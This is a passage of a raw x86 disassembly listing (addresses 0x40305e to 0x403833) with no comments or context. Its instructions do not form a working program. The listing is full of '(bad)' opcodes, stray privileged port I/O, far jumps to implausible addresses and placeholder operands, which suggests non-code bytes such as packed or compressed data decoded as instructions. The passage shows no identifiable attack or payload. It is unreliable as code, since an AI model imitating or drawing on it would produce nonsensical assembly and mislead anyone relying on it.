  40305e:	pop    ecx
  40305f:	popf   
  403060:	pop    ebp
  403061:	inc    ebp
  403062:	jno    0x403086
  403064:	mov    BYTE PTR [ebp+0x59501403],dh
  40306a:	pop    ds
  40306b:	cli    
  40306c:	push   edi
  40306d:	jmp    0x40303c
  40306f:	cs fcmovu st,st(2)
  403072:	out    0x71,eax
  403074:	and    DWORD PTR [esi],ebx
  403076:	push   edx
  403077:	add    BYTE PTR [ecx+esi*4-0x7a],al
  40307b:	orps   xmm2,XMMWORD PTR [esi+0x3336ebc0]
  403082:	in     al,dx
  403083:	lahf   
  403084:	fwait
  403085:	xlat   BYTE PTR ds:[ebx]
  403086:	clc    
  403087:	ret    0x78e3
  40308a:	mov    al,0x77
  40308c:	inc    edx
  40308d:	cld    
  40308e:	stc    
  40308f:	repz (bad) 
  403091:	mov    DWORD PTR [eax],edx
  403093:	lods   eax,DWORD PTR ds:[esi]
  403094:	adc    DWORD PTR [esi],eax
  403096:	je     0x403066
  403098:	stos   DWORD PTR es:[edi],eax
  403099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40309a:	dec    ecx
  40309b:	rcl    BYTE PTR [edi],1
  40309d:	jo     0x40307a
  40309f:	xor    BYTE PTR [ecx-0x26],bl
  4030a2:	ret    0xfedf
  4030a5:	mov    ebx,0xeea5716f
  4030aa:	retf   0xedf2
  4030ad:	dec    ebp
  4030ae:	add    ebp,DWORD PTR [ebp-0x339fcc28]
  4030b4:	inc    eax
  4030b5:	and    bh,BYTE PTR [ebp-0xbed333b]
  4030bb:	outs   dx,BYTE PTR ds:[esi]
  4030bc:	mov    eax,ds:0xfc9ec80a
  4030c1:	sbb    dh,ah
  4030c3:	xor    eax,0xcdfda512
  4030c8:	and    eax,0x549b4382
  4030cd:	or     ch,ch
  4030cf:	sar    ebx,0x44
  4030d2:	lea    esp,[edx+0x7b624557]
  4030d8:	add    ebp,esp
  4030da:	repz stc 
  4030dc:	movzx  edi,WORD PTR [ebp-0x73]
  4030e0:	out    dx,eax
  4030e1:	(bad)  
  4030e2:	mov    ecx,0xa38bc871
  4030e7:	xchg   esp,eax
  4030e8:	scas   eax,DWORD PTR es:[edi]
  4030e9:	sbb    eax,0xe022c531
  4030ee:	inc    edx
  4030ef:	les    ecx,FWORD PTR [eax+0x7]
  4030f2:	push   0xad1f2c6d
  4030f7:	and    ebp,DWORD PTR [esi-0x7f]
  4030fa:	cmp    dl,dl
  4030fc:	out    0x83,al
  4030fe:	inc    edx
  4030ff:	sar    DWORD PTR [eax+eax*2],0x4b
  403103:	cmp    dl,dh
  403105:	hlt    
  403106:	sbb    eax,0xb118d70e
  40310b:	retf   
  40310c:	fiadd  DWORD PTR [ebx+0x9]
  40310f:	arpl   WORD PTR [eax],di
  403111:	add    BYTE PTR [edi],ah
  403113:	pop    ebx
  403114:	retf   
  403115:	jge    0x403145
  403117:	int    0xbb
  403119:	inc    esi
  40311a:	(bad)
  40311d:	pop    esp
  40311e:	jge    0x403141
  403120:	loope  0x4030d3
  403122:	push   0x25f46335
  403127:	jmp    0xe3c3:0x4ebfef41
  40312e:	sbb    DWORD PTR [esi-0xa],edx
  403131:	aad    0x43
  403133:	ss add eax,0xde07445f
  403139:	inc    edi
  40313a:	mov    dh,0x6
  40313c:	in     eax,0xa4
  40313e:	sub    al,0xb2
  403140:	(bad)  
  403141:	jmp    0x40314a
  403143:	jmp    0x40317e
  403145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403146:	imul   esp,DWORD PTR [ebx+edi*4+0x1c],0x8ebbc681
  40314e:	fimul  WORD PTR [eax+0x61]
  403151:	int3   
  403152:	pop    es
  403153:	dec    esi
  403154:	pop    ss
  403155:	or     ah,BYTE PTR ds:0xdaf47941
  40315b:	(bad)  
  40315c:	pop    ss
  40315d:	daa    
  40315e:	push   ebp
  40315f:	repz fisub WORD PTR [ecx+eax*4]
  403163:	lds    esp,FWORD PTR [eax-0xc258c47]
  403169:	frstor [ebp-0x74a68599]
  40316f:	ret    0x9748
  403172:	push   eax
  403173:	hlt    
  403174:	das    
  403175:	jle    0x40317b
  403177:	mov    ebp,0xe02f570f
  40317c:	dec    edi
  40317d:	aam    0xf8
  40317f:	in     al,dx
  403180:	ins    BYTE PTR es:[edi],dx
  403181:	mov    ecx,0x5b7cf15c
  403186:	adc    al,0x6b
  403188:	jo     0x40317a
  40318a:	es out dx,al
  40318c:	push   ss
  40318d:	sbb    edi,DWORD PTR [edx-0x1fda267e]
  403193:	xchg   esp,eax
  403194:	jecxz  0x403189
  403196:	mov    ch,0xda
  403198:	sub    bh,bh
  40319a:	fnsetpm(287 only) 
  40319c:	xor    al,0x9b
  40319e:	inc    esp
  40319f:	int3   
  4031a0:	xchg   ebx,eax
  4031a1:	xor    DWORD PTR es:[ecx-0x3],esp
  4031a5:	push   edx
  4031a6:	push   0x191677ce
  4031ab:	in     al,0xaa
  4031ad:	jl     0x403169
  4031af:	mov    cl,BYTE PTR [edi]
  4031b1:	dec    ebp
  4031b2:	clc    
  4031b3:	out    0xce,eax
  4031b5:	and    bl,dh
  4031b7:	fistp  WORD PTR [ebx]
  4031b9:	add    edx,edx
  4031bb:	jne    0x403149
  4031bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031be:	cmc    
  4031bf:	call   0x22965369
  4031c4:	jno    0x403245
  4031c6:	repnz repnz push 0x9727d55e
  4031cd:	xchg   DWORD PTR ds:0x91f90166,eax
  4031d3:	push   ecx
  4031d4:	hlt    
  4031d5:	in     eax,0x32
  4031d7:	imul   eax,DWORD PTR [ecx],0xe2930051
  4031dd:	adc    al,0x72
  4031df:	mov    ds:0xb2fae72f,eax
  4031e4:	xchg   ecx,eax
  4031e5:	out    0x32,eax
  4031e7:	xchg   edi,eax
  4031e8:	cmc    
  4031e9:	pushf  
  4031ea:	fst    QWORD PTR [ebp+0x36]
  4031ed:	cmp    BYTE PTR [ecx+0x42c8b416],cl
  4031f3:	ja     0x40318f
  4031f5:	fld    QWORD PTR gs:[ebp+0xfae6e17]
  4031fc:	jmp    0x3abec8da
  403201:	std    
  403202:	test   eax,0x6bc3db91
  403207:	mov    ah,0xe3
  403209:	data16 (bad) 
  40320d:	(bad)  
  40320e:	sbb    al,0xa5
  403210:	inc    ebp
  403211:	cmp    bl,BYTE PTR [eax+0x55994cfb]
  403217:	jne    0x4031f8
  403219:	out    dx,eax
  40321a:	mov    al,ds:0x7974981d
  40321f:	or     al,0x89
  403221:	add    BYTE PTR [ecx-0x6a],ch
  403224:	loope  0x4031ee
  403226:	call   0xc16a03bb
  40322b:	sub    eax,DWORD PTR [edi+0x397a83d]
  403231:	push   esp
  403232:	push   ecx
  403233:	daa    
  403234:	cmp    al,0x2b
  403236:	stos   BYTE PTR es:[edi],al
  403237:	into   
  403238:	cmp    cl,BYTE PTR [ebx]
  40323a:	mov    esp,0x1c7d2f79
  40323f:	popa   
  403240:	addr16 nop
  403242:	mov    bl,0x67
  403244:	xor    ebp,DWORD PTR [eax+0x3f]
  403247:	mov    ?,ebx
  403249:	or     eax,0x23cfc359
  40324e:	pop    ds
  40324f:	fiadd  WORD PTR [edi+esi*1+0x4]
  403253:	mov    ch,0xa1
  403255:	shl    DWORD PTR ds:0x6be2d7a6,0xbf
  40325c:	pop    ds
  40325d:	push   esi
  40325e:	rcr    DWORD PTR ds:0x42b56084,0x78
  403265:	in     al,dx
  403266:	cmp    edx,0xffffffb3
  403269:	mov    al,0xff
  40326b:	arpl   ax,cx
  40326d:	inc    edx
  40326e:	sar    BYTE PTR [esi-0x51ace126],cl
  403274:	cwde   
  403275:	cmp    al,0x60
  403277:	stos   DWORD PTR es:[edi],eax
  403278:	dec    ecx
  403279:	test   bh,dl
  40327b:	push   esp
  40327c:	inc    edx
  40327d:	cmc    
  40327e:	dec    ebx
  40327f:	int3   
  403280:	adc    ebp,DWORD PTR cs:[edx+eiz*2]
  403284:	(bad)  
  403285:	push   edx
  403286:	cmc    
  403287:	cmp    eax,0x6136c980
  40328c:	adc    DWORD PTR [esi],ebp
  40328e:	xlat   BYTE PTR ds:[ebx]
  40328f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403290:	pusha  
  403291:	ret    0xda9e
  403294:	xor    al,0xf
  403296:	lea    ebp,[edi-0x556e71b2]
  40329c:	sub    al,0x4b
  40329e:	sbb    eax,0xcbb04fe4
  4032a3:	pop    esp
  4032a4:	(bad)  
  4032a5:	pop    ebp
  4032a6:	repnz xor DWORD PTR [edx+0x498f765e],ebp
  4032ad:	nop
  4032ae:	stos   BYTE PTR es:[edi],al
  4032af:	pop    es
  4032b0:	pop    ds
  4032b1:	inc    esi
  4032b2:	(bad)  
  4032b3:	cld    
  4032b4:	jnp    0x40327b
  4032b6:	push   es
  4032b7:	sbb    eax,0x4054a6dc
  4032bc:	out    dx,eax
  4032bd:	outs   dx,DWORD PTR ds:[esi]
  4032be:	xchg   ebp,eax
  4032bf:	rcr    al,cl
  4032c1:	stos   DWORD PTR es:[edi],eax
  4032c2:	pop    eax
  4032c3:	test   DWORD PTR [esi+edi*1+0x64929163],esi
  4032ca:	pop    ebp
  4032cb:	push   ebx
  4032cc:	and    al,0xb0
  4032ce:	push   edi
  4032cf:	cmp    eax,0xf554940d
  4032d4:	fwait
  4032d5:	xor    esi,eax
  4032d7:	in     al,0x95
  4032d9:	fstp   TBYTE PTR [ecx+edi*1]
  4032dc:	stos   BYTE PTR es:[edi],al
  4032dd:	arpl   WORD PTR [edi],ax
  4032df:	inc    esp
  4032e0:	mov    eax,ds:0xb9a7d0f
  4032e5:	and    al,BYTE PTR [eax]
  4032e7:	xchg   esp,eax
  4032e8:	and    eax,0x3b9e6896
  4032ed:	jns    0x403366
  4032ef:	and    edx,ebx
  4032f1:	in     eax,dx
  4032f2:	hlt    
  4032f3:	test   DWORD PTR [edx],ebx
  4032f5:	mov    ah,0x36
  4032f7:	call   0xe6ea:0xe6f4c916
  4032fe:	inc    al
  403300:	xor    dh,dl
  403302:	ins    BYTE PTR es:[edi],dx
  403303:	and    eax,0xb637b4e7
  403308:	xchg   DWORD PTR [ecx],esp
  40330a:	pop    ss
  40330b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40330c:	mov    ss,WORD PTR ds:0xdf322477
  403312:	pop    edi
  403313:	push   edx
  403314:	mov    cl,0x47
  403316:	pop    ss
  403317:	pop    ds
  403318:	ins    BYTE PTR es:[edi],dx
  403319:	out    dx,eax
  40331a:	mov    edx,0x80eb9bd5
  40331f:	adc    al,0xe9
  403321:	push   edx
  403322:	(bad)  
  403323:	pop    esi
  403324:	fmul   DWORD PTR [edx-0x63cf3885]
  40332a:	sub    al,0x65
  40332c:	pop    eax
  40332d:	xchg   BYTE PTR [edi-0x3e],cl
  403330:	sub    cl,ah
  403332:	push   ss
  403333:	lds    ecx,FWORD PTR [edi+0x3f]
  403336:	ret    
  403337:	jge    0x4032fc
  403339:	and    edx,DWORD PTR [esi]
  40333b:	stc    
  40333c:	ret    0x769a
  40333f:	and    ch,ch
  403341:	jae    0x4032dc
  403343:	cld    
  403344:	(bad)  [ebx-0x6be4fe94]
  40334a:	push   ss
  40334b:	clc    
  40334c:	sahf   
  40334d:	push   ebp
  40334e:	dec    edi
  40334f:	mov    bh,0x15
  403351:	jl     0x40337c
  403353:	pop    ebx
  403354:	outs   dx,BYTE PTR ds:[esi]
  403355:	(bad)  
  403356:	(bad)  
  403357:	out    dx,eax
  403358:	(bad)  
  403359:	nop
  40335a:	mov    DWORD PTR [eax+0x2e],edx
  40335d:	dec    ebx
  40335e:	mov    edi,DWORD PTR [ebx-0x913e8f1]
  403364:	bswap  ebx
  403366:	sti    
  403367:	mov    edi,0x63419049
  40336c:	sti    
  40336d:	mov    BYTE PTR [eax],dl
  40336f:	outs   dx,BYTE PTR ds:[esi]
  403370:	dec    ebx
  403371:	enter  0xfe3d,0xa7
  403375:	cmp    dh,dl
  403377:	ins    BYTE PTR es:[edi],dx
  403378:	adc    eax,DWORD PTR ds:0x8ef05bf4
  40337e:	(bad)  
  403380:	push   esi
  403381:	add    DWORD PTR [ebx+edx*8+0x485ea152],0xc88352bd
  40338c:	or     ebp,DWORD PTR [ebx]
  40338e:	leave  
  40338f:	loop   0x40337f
  403391:	or     al,0xc6
  403393:	mov    al,0x4d
  403395:	mov    cl,0x11
  403397:	add    DWORD PTR [esi],0x1f
  40339a:	cli    
  40339b:	add    ebx,DWORD PTR [ebp+0x27a3d534]
  4033a1:	and    BYTE PTR [edx],0x9
  4033a4:	int3   
  4033a5:	mov    ecx,0xe9bacf9a
  4033aa:	sar    DWORD PTR [ecx-0x56],cl
  4033ad:	sub    esp,DWORD PTR [edx]
  4033af:	sbb    eax,0x37b4882b
  4033b4:	es cmp ebp,edx
  4033b7:	or     DWORD PTR [eax-0x8],0xe90d1d56
  4033be:	or     al,0xbe
  4033c0:	mov    ebp,0x39d74f77
  4033c5:	inc    ecx
  4033c7:	das    
  4033c8:	mov    BYTE PTR [ebx+0x1f],cl
  4033cb:	xchg   DWORD PTR [edi],ebx
  4033cd:	cmp    cl,0xa3
  4033d0:	inc    eax
  4033d1:	ja     0x4033de
  4033d3:	xor    dl,BYTE PTR [edi+0x3fd93e0c]
  4033d9:	adc    BYTE PTR [edi+0x52a740ad],ah
  4033df:	jl     0x40343d
  4033e1:	adc    al,0x12
  4033e3:	xor    cl,BYTE PTR [eax]
  4033e5:	mov    ebx,0x8380b4bd
  4033ea:	cmp    al,0xa2
  4033ec:	paddd  mm7,QWORD PTR [eax+0xa]
  4033f0:	dec    edx
  4033f1:	xchg   ecx,eax
  4033f2:	out    0x91,al
  4033f4:	outs   dx,BYTE PTR ds:[esi]
  4033f5:	jmp    0x4f7:0x834ba380
  4033fc:	sbb    dl,BYTE PTR [eax]
  4033fe:	sar    DWORD PTR [ecx-0x3d9c0775],0xfa
  403405:	leave  
  403406:	popf   
  403407:	cmc    
  403408:	ja     0x403485
  40340a:	lods   al,BYTE PTR ds:[esi]
  40340b:	and    ah,bh
  40340d:	outs   dx,BYTE PTR ds:[esi]
  40340e:	popf   
  40340f:	punpcklwd mm1,DWORD PTR [eax]
  403412:	sub    eax,0x48f789c3
  403417:	imul   ebx,DWORD PTR [esi],0x5c9c6e2b
  40341d:	sbb    ebp,esp
  40341f:	push   ebp
  403420:	push   edi
  403421:	bound  edi,QWORD PTR [ecx-0x15426c15]
  403427:	push   cs
  403428:	mov    ecx,ss
  40342a:	stos   BYTE PTR es:[edi],al
  40342b:	or     dh,dh
  40342d:	nop
  40342e:	inc    edi
  40342f:	mov    edx,0x64315b2b
  403434:	fnstcw WORD PTR [edx-0x35]
  403437:	shr    DWORD PTR [edx],0x33
  40343a:	xor    eax,DWORD PTR es:[ebp+0x59c407a3]
  403441:	adc    BYTE PTR [edx+0x32b6a2fa],cl
  403447:	les    eax,FWORD PTR [esp+eax*2]
  40344a:	out    0xb4,eax
  40344c:	das    
  40344d:	dec    ecx
  40344e:	lock and ecx,ebx
  403451:	push   ss
  403452:	sbb    ebp,eax
  403454:	jbe    0xf5792e5f
  40345a:	test   BYTE PTR [edx],ah
  40345c:	xor    al,0x3a
  40345e:	(bad)  
  40345f:	fstp   TBYTE PTR [ebx-0x2e]
  403462:	inc    ecx
  403463:	fmul   st(4),st
  403465:	iret   
  403466:	sti    
  403467:	add    eax,0xdd22f67c
  40346c:	xlat   BYTE PTR ds:[ebx]
  40346d:	in     al,0x37
  40346f:	jl     0x403473
  403471:	pop    ebp
  403472:	or     DWORD PTR [ecx-0x6742a773],esp
  403478:	adc    esp,DWORD PTR [esi+0x60]
  40347b:	lds    edi,FWORD PTR [edi]
  40347d:	pop    es
  40347e:	xchg   ecx,eax
  40347f:	jne    0x403407
  403481:	mov    ah,0xf0
  403483:	adc    al,0x99
  403485:	stos   BYTE PTR es:[edi],al
  403486:	mov    esi,?
  403488:	bound  esp,QWORD PTR [ebx-0x501646a3]
  40348e:	test   eax,0x6e26e2bd
  403493:	mov    ds:0x886c12eb,al
  403498:	mov    ch,BYTE PTR [ecx+0x58]
  40349b:	(bad)  
  40349c:	cmp    bl,bh
  40349e:	mov    al,0x45
  4034a0:	ss jecxz 0x40345e
  4034a3:	(bad)  
  4034a4:	ficom  DWORD PTR [ebp+0x43dfab59]
  4034aa:	pop    es
  4034ab:	dec    eax
  4034ac:	fbld   TBYTE PTR ds:0xda1556e5
  4034b2:	fild   WORD PTR [edx+0x15531c91]
  4034b8:	jnp    0x40351c
  4034ba:	and    dh,BYTE PTR [eax]
  4034bc:	bound  edx,QWORD PTR [ebx]
  4034be:	(bad)  
  4034bf:	(bad)  
  4034c0:	and    eax,0x660b2949
  4034c5:	xchg   edx,eax
  4034c6:	test   DWORD PTR [edx-0x18],0x8d42ff68
  4034cd:	std    
  4034ce:	dec    edi
  4034cf:	mov    eax,ds:0xda861966
  4034d4:	sbb    cl,bl
  4034d6:	mov    eax,ds:0xbeadb8aa
  4034db:	ins    DWORD PTR es:[edi],dx
  4034dc:	jno    0x40347b
  4034de:	loopne 0x403527
  4034e0:	sahf   
  4034e1:	retf   
  4034e2:	mov    ds:0x784095a1,eax
  4034e7:	pop    edx
  4034e8:	fistp  WORD PTR [ebp+ecx*2+0x7effdd93]
  4034ef:	adc    DWORD PTR [edx],ebp
  4034f1:	sub    al,0xd7
  4034f3:	mov    ebp,DWORD PTR [edx-0x5a]
  4034f6:	lods   eax,DWORD PTR ds:[esi]
  4034f7:	cs inc BYTE PTR gs:[esi]
  4034fb:	idiv   DWORD PTR [edx-0x402a56cc]
  403501:	mov    ah,0xe4
  403503:	cmc    
  403504:	adc    DWORD PTR [edx+ecx*1+0x27],ebx
  403508:	mov    ds:0xcb804c2,al
  40350d:	in     eax,0x3a
  40350f:	mov    fs,WORD PTR [ebp+0x1e]
  403512:	(bad)  
  403513:	ret    
  403514:	inc    eax
  403515:	and    ecx,eax
  403517:	les    edx,FWORD PTR [ecx]
  403519:	fdiv   QWORD PTR [edx+0x1d]
  40351c:	ins    BYTE PTR es:[edi],dx
  40351d:	mov    edi,ebp
  40351f:	jp     0x4034d3
  403521:	test   al,0x88
  403523:	dec    edi
  403524:	cs push 0x9fb56fa4
  40352a:	fld    QWORD PTR [esi-0x55088923]
  403530:	inc    ebp
  403531:	gs popa 
  403533:	es ret 0x1de
  403537:	ror    DWORD PTR [edi-0x7c],cl
  40353a:	pushf  
  40353b:	sub    al,0x92
  40353d:	loopne 0x4034d9
  40353f:	lods   eax,DWORD PTR ds:[esi]
  403540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403541:	sub    edx,DWORD PTR [ebx]
  403543:	(bad)  
  403544:	cmp    esp,ebp
  403546:	inc    edx
  403547:	push   esi
  403548:	lahf   
  403549:	jnp    0x4034fd
  40354b:	sub    BYTE PTR [ebp+0x5bb9b56],al
  403551:	sbb    BYTE PTR [ebp+0x40f2a7a1],dh
  403557:	cwde   
  403558:	mov    ds,WORD PTR [edx-0x66f75834]
  40355e:	das    
  40355f:	cmp    dl,dl
  403561:	gs clc 
  403563:	cld    
  403564:	(bad)  
  403565:	daa    
  403566:	mov    bh,0x44
  403568:	mov    dh,0x7
  40356a:	push   0x8f40131
  40356f:	mov    cl,0x6
  403571:	jl     0x403593
  403573:	and    al,0x37
  403575:	setae  ah
  403578:	xchg   edx,eax
  403579:	inc    ebx
  40357a:	pushf  
  40357b:	aas    
  40357c:	int    0x10
  40357e:	adc    al,0x6a
  403580:	fstp   TBYTE PTR [ecx-0x718aca4]
  403586:	jo     0x40355f
  403588:	xlat   BYTE PTR ds:[ebx]
  403589:	sti    
  40358a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358b:	cmp    eax,edi
  40358d:	pop    edx
  40358e:	xor    esp,esi
  403590:	fnstenv [edx+edi*1]
  403593:	loop   0x403553
  403595:	sub    eax,0x2831a734
  40359a:	popa   
  40359b:	daa    
  40359c:	rcr    bl,cl
  40359e:	mov    ch,0x29
  4035a0:	mov    eax,ds:0x83598b56
  4035a5:	shr    BYTE PTR [eax+0x66],0xf8
  4035a9:	xchg   esi,eax
  4035aa:	aas    
  4035ab:	std    
  4035ac:	int    0x55
  4035ae:	iret   
  4035af:	push   DWORD PTR fs:[edx-0x3e1d092f]
  4035b6:	mov    ch,0xb0
  4035b8:	sbb    BYTE PTR [edx-0x1c],dh
  4035bb:	into   
  4035bc:	mov    ecx,0x2c06dafb
  4035c1:	mov    edi,0x8fda8b5d
  4035c6:	jg     0x40362f
  4035c8:	outs   dx,BYTE PTR ds:[esi]
  4035c9:	xor    eax,0x978d2b6b
  4035ce:	xor    bl,cl
  4035d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d1:	and    dl,dh
  4035d3:	push   ss
  4035d4:	mov    ebp,0x55839f1d
  4035d9:	out    dx,al
  4035da:	jo     0x40358a
  4035dc:	mov    cl,0xdc
  4035de:	dec    esi
  4035df:	xor    bh,ah
  4035e1:	call   DWORD PTR [edx+ebp*1]
  4035e4:	iret   
  4035e5:	je     0x4035fc
  4035e7:	loope  0x40359d
  4035e9:	popa   
  4035ea:	js     0x403625
  4035ec:	pop    edi
  4035ed:	bound  edi,QWORD PTR [ecx+0x1dcb2036]
  4035f3:	mov    ah,0xd9
  4035f5:	fidivr DWORD PTR [edx]
  4035f7:	adc    dh,BYTE PTR [ebx+edi*4-0x70a5b077]
  4035fe:	out    dx,eax
  4035ff:	dec    ebp
  403600:	add    eax,0xb9260834
  403605:	mov    esp,0x4ab0f9e9
  40360a:	(bad)  
  40360b:	aas    
  40360c:	add    DWORD PTR [edx-0x2f],0x23a661dc
  403613:	jo     0x403689
  403615:	stc    
  403616:	stos   BYTE PTR es:[edi],al
  403617:	or     al,0xcb
  403619:	dec    ebp
  40361a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40361b:	xchg   esi,eax
  40361c:	add    eax,0xab1d580d
  403621:	and    eax,DWORD PTR [ecx+0x69]
  403624:	inc    esi
  403625:	sub    al,0x1c
  403627:	rcl    BYTE PTR [ebp-0x7bd31d22],0x4d
  40362e:	push   ecx
  40362f:	cmc    
  403630:	daa    
  403631:	lock xlat BYTE PTR ds:[ebx]
  403633:	aam    0x2d
  403635:	pop    ecx
  403636:	(bad)  
  403637:	arpl   WORD PTR [edx+0x18],dx
  40363a:	pop    edx
  40363b:	fiadd  WORD PTR [edx]
  40363d:	cld    
  40363e:	fwait
  40363f:	xchg   DWORD PTR [edi],ecx
  403641:	sbb    ebp,DWORD PTR [ebp+0x4e452f89]
  403647:	pop    eax
  403648:	ins    DWORD PTR es:[edi],dx
  403649:	adc    ch,BYTE PTR [edx-0x467a0656]
  40364f:	ret    0x30b8
  403652:	push   esi
  403653:	sbb    BYTE PTR [edi+0x59652b61],al
  403659:	pop    eax
  40365a:	rep stos BYTE PTR es:[edi],al
  40365c:	shl    DWORD PTR [ebp+0x2f],cl
  40365f:	xor    bh,BYTE PTR [ebp+0x2e]
  403662:	mov    ds:0xce4b43b1,eax
  403667:	sbb    BYTE PTR [ebx-0x236790e5],cl
  40366d:	int    0x93
  40366f:	jmp    DWORD PTR [eax+0x79]
  403672:	xchg   edx,eax
  403673:	lock sub edi,DWORD PTR [edi]
  403676:	add    ch,bh
  403678:	mov    edx,0x714f68a2
  40367d:	sbb    al,0xff
  40367f:	pop    es
  403680:	xchg   BYTE PTR [esi],al
  403682:	sub    al,0xbe
  403684:	or     dh,BYTE PTR [esi+0x56767b29]
  40368a:	aad    0x61
  40368c:	adc    BYTE PTR [ecx+0x6f314383],al
  403692:	add    eax,0x570b49fb
  403697:	in     al,0x11
  403699:	mov    BYTE PTR [ebx+0x14],0x3a
  40369d:	mov    ebp,0xc6f3b20f
  4036a2:	fadd   QWORD PTR [ecx]
  4036a4:	pop    ecx
  4036a5:	gs pop esi
  4036a7:	push   ebp
  4036a8:	xchg   ebp,eax
  4036a9:	mov    eax,0x182f568
  4036ae:	mov    cl,0x14
  4036b0:	dec    ebp
  4036b1:	ja     0x40371d
  4036b3:	outs   dx,DWORD PTR ds:[esi]
  4036b4:	and    BYTE PTR ds:0xf8bb3bb,ch
  4036ba:	inc    esp
  4036bb:	int3   
  4036bc:	cld    
  4036bd:	ins    DWORD PTR es:[edi],dx
  4036be:	jne    0x40372d
  4036c0:	(bad)  
  4036c1:	mov    ebp,0x6a554444
  4036c6:	xchg   ecx,eax
  4036c7:	mov    cl,0xd4
  4036c9:	call   0x7e44:0xaede384b
  4036d0:	lock push ebp
  4036d2:	arpl   ax,si
  4036d4:	aaa    
  4036d5:	inc    esi
  4036d6:	sbb    eax,0xe99fbe22
  4036db:	jb     0x4036a7
  4036dd:	sbb    eax,0xb046abc5
  4036e2:	dec    ebx
  4036e3:	jne    0x40374f
  4036e5:	push   0x21931725
  4036ea:	iret   
  4036eb:	es jmp 0x40374d
  4036ee:	mov    dh,0x46
  4036f0:	jae    0x4036d7
  4036f2:	mov    ah,0xa7
  4036f4:	pop    ds
  4036f5:	dec    DWORD PTR [edx]
  4036f7:	enter  0x3ed8,0x97
  4036fb:	and    ebx,DWORD PTR [ebp-0x46]
  4036fe:	jle    0x403698
  403700:	sbb    eax,0x97caaa49
  403705:	ror    DWORD PTR [ecx+0x10bc2b38],0x40
  40370c:	bound  ebx,QWORD PTR [edi-0x136f1169]
  403712:	push   edx
  403713:	bound  ebp,QWORD PTR [eax+0x4c]
  403716:	aas    
  403717:	lahf   
  403718:	out    0x8c,al
  40371a:	in     eax,dx
  40371b:	ja     0x4036e7
  40371d:	xor    DWORD PTR [edx+0x51],edi
  403720:	inc    ebx
  403721:	mov    eax,0xcdaa7e1b
  403726:	jns    0x403798
  403728:	xor    eax,0x244c6f19
  40372d:	in     al,dx
  40372e:	sbb    BYTE PTR [ebp+0x8],0x9f
  403732:	or     al,0x9f
  403734:	mov    edi,0xe898317e
  403739:	(bad)  
  40373a:	jle    0x4036dc
  40373c:	pusha  
  40373d:	push   ss
  40373e:	pop    esi
  40373f:	bound  esi,QWORD PTR [ebx]
  403741:	pop    esp
  403742:	cmc    
  403743:	out    dx,al
  403744:	push   ds
  403745:	scas   eax,DWORD PTR es:[edi]
  403746:	xchg   edi,eax
  403747:	or     BYTE PTR [edi],dh
  403749:	jns    0x40370c
  40374b:	dec    ebp
  40374c:	sbb    al,0xc5
  40374e:	mov    ch,bh
  403750:	cli    
  403751:	jl     0x4037a4
  403753:	or     eax,0x81f19cb3
  403758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403759:	push   eax
  40375a:	mov    ah,0x10
  40375c:	aad    0x77
  40375e:	push   esi
  40375f:	nop
  403760:	ds aam 0xa1
  403763:	leave  
  403764:	fldenv [esi+0x6b3cc418]
  40376a:	fadd   st,st(4)
  40376c:	lds    esp,FWORD PTR [ebp+0x160e9451]
  403772:	inc    edi
  403773:	xchg   BYTE PTR [eax],ah
  403775:	sbb    al,0x4b
  403777:	mov    ebx,0x7921c221
  40377c:	cs (bad) 
  40377f:	inc    esp
  403780:	mov    bh,0x16
  403782:	sub    BYTE PTR [ebx-0x7d],dh
  403785:	sbb    al,0x39
  403787:	mov    bl,0x3e
  403789:	cmp    ebx,DWORD PTR [ebx]
  40378b:	cwde   
  40378c:	fcomp  DWORD PTR [ecx+0x272ee80b]
  403792:	sbb    eax,0xf1f7f6d4
  403797:	push   ebx
  403798:	pusha  
  403799:	imul   ebp,DWORD PTR [edx],0x7e
  40379c:	cmp    eax,0x4534fa4b
  4037a1:	add    esi,esi
  4037a3:	and    al,0x65
  4037a5:	sbb    al,0x20
  4037a7:	add    ebp,esi
  4037a9:	mov    ecx,0x706b54ff
  4037ae:	jmp    0x403772
  4037b0:	addr16 mov esp,0x3ae2c740
  4037b6:	inc    eax
  4037b7:	xor    ch,BYTE PTR ds:0x7367799f
  4037bd:	hlt    
  4037be:	icebp  
  4037bf:	sbb    DWORD PTR [edi+0x2f2125aa],esi
  4037c5:	and    eax,0xb1a98234
  4037ca:	ret    
  4037cb:	shl    DWORD PTR [eax+0x3fceed70],1
  4037d1:	mov    fs:0x68995c4d,eax
  4037d7:	xor    eax,0xd44693f8
  4037dc:	bswap  esp
  4037de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037df:	sbb    al,dl
  4037e1:	and    ebx,DWORD PTR [esi]
  4037e3:	mov    ebx,0xbcbde6d5
  4037e8:	mov    ebx,ebx
  4037ea:	call   FWORD PTR [edi+0x7af1c0bd]
  4037f0:	jae    0x403786
  4037f2:	adc    DWORD PTR [ebx-0x7b4416e4],edi
  4037f8:	out    0x27,eax
  4037fa:	in     al,dx
  4037fb:	lea    edx,[ecx-0x3f]
  4037fe:	mov    al,0xcd
  403800:	push   0xc
  403802:	hlt    
  403803:	div    BYTE PTR [edi+0x4a]
  403806:	add    DWORD PTR [edx+ebx*2],eax
  403809:	outs   dx,BYTE PTR ds:[esi]
  40380a:	mov    cl,0xcf
  40380c:	ret    
  40380d:	add    bl,BYTE PTR [ecx-0x71044322]
  403813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403814:	xchg   esp,eax
  403815:	inc    ebp
  403816:	jg     0x4037bc
  403818:	and    DWORD PTR [eax-0x3a],0x74bcd73e
  40381f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403820:	pop    edx
  403821:	dec    esi
  403822:	jmp    0x36257148
  403827:	inc    ecx
  403828:	stos   DWORD PTR es:[edi],eax
  403829:	pop    esi
  40382a:	dec    ecx
  40382b:	cmp    BYTE PTR [edi-0x18],bh
  40382e:	aas    
  40382f:	or     al,0xb6
  403831:	rol    ch,1
  403833:	add    eax,0xc9e4a5b7
